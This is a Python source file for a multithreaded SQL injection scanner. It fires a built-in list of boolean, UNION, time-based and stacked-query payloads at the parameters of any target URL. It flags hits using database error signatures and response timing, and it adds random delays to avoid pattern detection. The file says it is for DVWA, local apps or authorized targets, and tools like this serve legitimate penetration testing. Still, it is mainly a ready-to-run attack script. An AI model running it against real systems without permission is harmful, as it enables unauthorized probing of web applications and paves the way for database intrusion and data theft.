"""
SQL Injection Scanner
=====================
A script that probes web form inputs for common SQL injection patterns.
For legal/ethical use only — test against DVWA, local apps, or targets
you have explicit permission to test.

Usage:
    python scanner.py --url http://localhost/dvwa/vulnerabilities/sqli/ \
                      --data "id=1&Submit=Submit" \
                      --cookie "PHPSESSID=abc123; security=low" \
                      --threads 5 \
                      --rate-limit 1.0 \
                      --log results.log
"""

import argparse
import logging
import sys
import time
import random
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional

import requests
from requests.exceptions import RequestException

# ---------------------------------------------------------------------------
# SQL Injection Payloads
# ---------------------------------------------------------------------------
PAYLOADS = [
    # Classic boolean-based
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1 --",
    "' OR 1=1#",
    '" OR "1"="1"',
    "1' OR '1'='1",
    "1 OR 1=1",
    # Always-true numeric
    "1 OR 1=1--",
    "1' OR '1'='1'--",
    # Comment-based termination
    "';--",
    "' --",
    "' #",
    "') --",
    "')) --",
    # UNION-based (basic fingerprint)
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    # Error-triggering (forces DB errors)
    "'",
    '"',
    "\\",
    "''",
    # Time-based blind (generic)
    "' AND SLEEP(2)--",
    "'; WAITFOR DELAY '0:0:2'--",
    "1; WAITFOR DELAY '0:0:2'--",
    # Stacked queries (detection probe)
    "'; SELECT 1--",
]

# ---------------------------------------------------------------------------
# Error signatures that indicate SQLi vulnerability
# ---------------------------------------------------------------------------
ERROR_SIGNATURES = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch_array()",
    "mysql_num_rows()",
    "mysql_fetch_assoc()",
    "supplied argument is not a valid mysql",
    # SQLite
    "sqlite_error",
    "sqlite3.operationalerror",
    "sqlite_",
    # MSSQL / SQL Server
    "microsoft ole db provider for odbc drivers error",
    "odbc sql server driver",
    "odbc microsoft access driver",
    "microsoft jet database engine",
    "unclosed quotation mark",
    "incorrect syntax near",
    "sql server",
    # PostgreSQL
    "pg_query()",
    "pg_exec()",
    "postgresql error",
    "pgsql error",
    "error: parser:",
    "unterminated quoted string at or near",
    # Oracle
    "ora-00907",
    "ora-00933",
    "ora-01756",
    "oracle error",
    # Generic
    "sql syntax",
    "syntax error",
    "sql error",
    "database error",
    "invalid query",
    "quoted string not properly terminated",
]

# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------
@dataclass
class ScanResult:
    url: str
    parameter: str
    payload: str
    vulnerable: bool
    reason: str
    status_code: int
    response_time: float
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


# ---------------------------------------------------------------------------
# Scanner class
# ---------------------------------------------------------------------------
class SQLiScanner:
    def __init__(
        self,
        url: str,
        data: Optional[str] = None,
        cookies: Optional[str] = None,
        headers: Optional[dict] = None,
        method: str = "GET",
        threads: int = 5,
        rate_limit: float = 0.5,
        timeout: int = 10,
        time_threshold: float = 3.0,
        log_file: Optional[str] = None,
    ):
        self.url = url
        self.base_data = self._parse_params(data) if data else {}
        self.cookies = self._parse_cookies(cookies) if cookies else {}
        self.headers = headers or {
            "User-Agent": "SQLiScanner/1.0 (Educational/Authorized Use Only)"
        }
        self.method = method.upper()
        self.threads = threads
        self.rate_limit = rate_limit
        self.timeout = timeout
        self.time_threshold = time_threshold
        self.results: list[ScanResult] = []
        self._setup_logging(log_file)

    # ------------------------------------------------------------------
    # Setup
    # ------------------------------------------------------------------
    def _setup_logging(self, log_file: Optional[str]):
        handlers: list[logging.Handler] = [logging.StreamHandler(sys.stdout)]
        if log_file:
            handlers.append(logging.FileHandler(log_file))
        logging.basicConfig(
            level=logging.INFO,
            format="%(asctime)s [%(levelname)s] %(message)s",
            handlers=handlers,
        )
        self.logger = logging.getLogger(__name__)

    @staticmethod
    def _parse_params(raw: str) -> dict:
        return dict(urllib.parse.parse_qsl(raw))

    @staticmethod
    def _parse_cookies(raw: str) -> dict:
        cookies = {}
        for part in raw.split(";"):
            part = part.strip()
            if "=" in part:
                k, v = part.split("=", 1)
                cookies[k.strip()] = v.strip()
        return cookies

    # ------------------------------------------------------------------
    # Core probing
    # ------------------------------------------------------------------
    def _send_request(self, params: dict) -> tuple[Optional[requests.Response], float]:
        start = time.monotonic()
        try:
            if self.method == "POST":
                resp = requests.post(
                    self.url,
                    data=params,
                    cookies=self.cookies,
                    headers=self.headers,
                    timeout=self.timeout,
                    allow_redirects=True,
                )
            else:
                resp = requests.get(
                    self.url,
                    params=params,
                    cookies=self.cookies,
                    headers=self.headers,
                    timeout=self.timeout,
                    allow_redirects=True,
                )
            elapsed = time.monotonic() - start
            return resp, elapsed
        except RequestException as e:
            elapsed = time.monotonic() - start
            self.logger.debug(f"Request error: {e}")
            return None, elapsed

    def _check_error_based(self, response: requests.Response) -> tuple[bool, str]:
        body = response.text.lower()
        for sig in ERROR_SIGNATURES:
            if sig in body:
                return True, f"Error signature detected: '{sig}'"
        return False, ""

    def _probe_parameter(self, param: str, payload: str) -> ScanResult:
        # Rate limiting with small random jitter to avoid pattern detection
        time.sleep(self.rate_limit + random.uniform(0, 0.2))

        injected_params = {**self.base_data, param: payload}
        resp, elapsed = self._send_request(injected_params)

        if resp is None:
            return ScanResult(
                url=self.url,
                parameter=param,
                payload=payload,
                vulnerable=False,
                reason="Request failed / no response",
                status_code=0,
                response_time=elapsed,
            )

        # 1. Error-based detection
        vulnerable, reason = self._check_error_based(resp)

        # 2. Time-based blind detection
        if not vulnerable and elapsed >= self.time_threshold:
            if "SLEEP" in payload.upper() or "WAITFOR" in payload.upper():
                vulnerable = True
                reason = f"Time-based blind SQLi suspected (response took {elapsed:.2f}s)"

        return ScanResult(
            url=self.url,
            parameter=param,
            payload=payload,
            vulnerable=vulnerable,
            reason=reason if vulnerable else "No indicators found",
            status_code=resp.status_code,
            response_time=elapsed,
        )

    # ------------------------------------------------------------------
    # Scan orchestration
    # ------------------------------------------------------------------
    def scan(self):
        if not self.base_data:
            self.logger.error(
                "No parameters to test. Provide --data 'param=value' "
                "or include query params in the URL."
            )
            sys.exit(1)

        jobs = [
            (param, payload)
            for param in self.base_data
            for payload in PAYLOADS
        ]

        self.logger.info(f"Target URL    : {self.url}")
        self.logger.info(f"Method        : {self.method}")
        self.logger.info(f"Parameters    : {list(self.base_data.keys())}")
        self.logger.info(f"Payloads      : {len(PAYLOADS)}")
        self.logger.info(f"Total jobs    : {len(jobs)}")
        self.logger.info(f"Threads       : {self.threads}")
        self.logger.info(f"Rate limit    : {self.rate_limit}s per request")
        self.logger.info("=" * 60)

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {
                executor.submit(self._probe_parameter, param, payload): (param, payload)
                for param, payload in jobs
            }
            for future in as_completed(futures):
                result = future.result()
                self.results.append(result)

                if result.vulnerable:
                    self.logger.warning(
                        f"[VULNERABLE] param='{result.parameter}' | "
                        f"payload='{result.payload}' | "
                        f"reason='{result.reason}' | "
                        f"status={result.status_code} | "
                        f"time={result.response_time:.2f}s"
                    )
                else:
                    self.logger.debug(
                        f"[safe] param='{result.parameter}' | "
                        f"payload='{result.payload[:30]}' | "
                        f"status={result.status_code}"
                    )

        self._print_summary()

    # ------------------------------------------------------------------
    # Reporting
    # ------------------------------------------------------------------
    def _print_summary(self):
        vulnerable = [r for r in self.results if r.vulnerable]
        self.logger.info("=" * 60)
        self.logger.info(f"SCAN COMPLETE — {len(self.results)} probes sent")
        self.logger.info(f"Vulnerable findings : {len(vulnerable)} / {len(self.results)}")

        if vulnerable:
            self.logger.info("\n--- Vulnerable Parameters ---")
            seen: set = set()
            for r in vulnerable:
                key = (r.parameter, r.reason.split(":")[0])
                if key not in seen:
                    seen.add(key)
                    self.logger.info(
                        f"  Parameter : {r.parameter}\n"
                        f"  Reason    : {r.reason}\n"
                        f"  Payload   : {r.payload}\n"
                    )
        else:
            self.logger.info("No SQLi vulnerabilities detected.")


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------
def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="SQL Injection Scanner — for authorized targets only.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument(
        "--data", help="Parameters in URL-encoded form: 'id=1&Submit=Submit'"
    )
    parser.add_argument(
        "--method", default="GET", choices=["GET", "POST"], help="HTTP method"
    )
    parser.add_argument("--cookie", help="Cookies: 'PHPSESSID=abc; security=low'")
    parser.add_argument("--threads", type=int, default=5, help="Concurrent threads")
    parser.add_argument(
        "--rate-limit", type=float, default=0.5, help="Seconds between requests"
    )
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout (s)")
    parser.add_argument(
        "--time-threshold",
        type=float,
        default=3.0,
        help="Response time (s) to flag time-based blind injection",
    )
    parser.add_argument("--log", help="Path to output log file")
    return parser.parse_args()


def print_banner():
    print("""
  ____  ___  _     _       _                _   _
 / ___||  _ \\| |   (_)     (_)_ __  _  ___  ___| |_(_) ___  _ __
 \\___ \\| | | | |   | |     | | '_ \\| |/ _ \\/ __| __| |/ _ \\| '_ \\
  ___) | |_| | |___| |___  | | | | | |  __/ (__| |_| | (_) | | | |
 |____/|____/|_____|_____| |_|_| |_| |\\___|\\___|\\___|_|\\___/|_| |_|
                                   |__/
  ____
 / ___|  ___ __ _ _ __  _ __   ___ _ __
 \\___ \\ / __/ _` | '_ \\| '_ \\ / _ \\ '__|
  ___) | (_| (_| | | | | | | |  __/ |
 |____/ \\___\\__,_|_| |_|_| |_|\\___|_|

  [!] Authorized / legal use only — DVWA, local apps, or with permission.
""")


if __name__ == "__main__":
    print_banner()
    args = parse_args()

    # If URL has query params but no --data provided, extract them automatically
    parsed = urllib.parse.urlparse(args.url)
    if not args.data and parsed.query:
        args.data = parsed.query
        args.url = urllib.parse.urlunparse(parsed._replace(query=""))

    scanner = SQLiScanner(
        url=args.url,
        data=args.data,
        cookies=args.cookie,
        method=args.method,
        threads=args.threads,
        rate_limit=args.rate_limit,
        timeout=args.timeout,
        time_threshold=args.time_threshold,
        log_file=args.log,
    )
    scanner.scan()
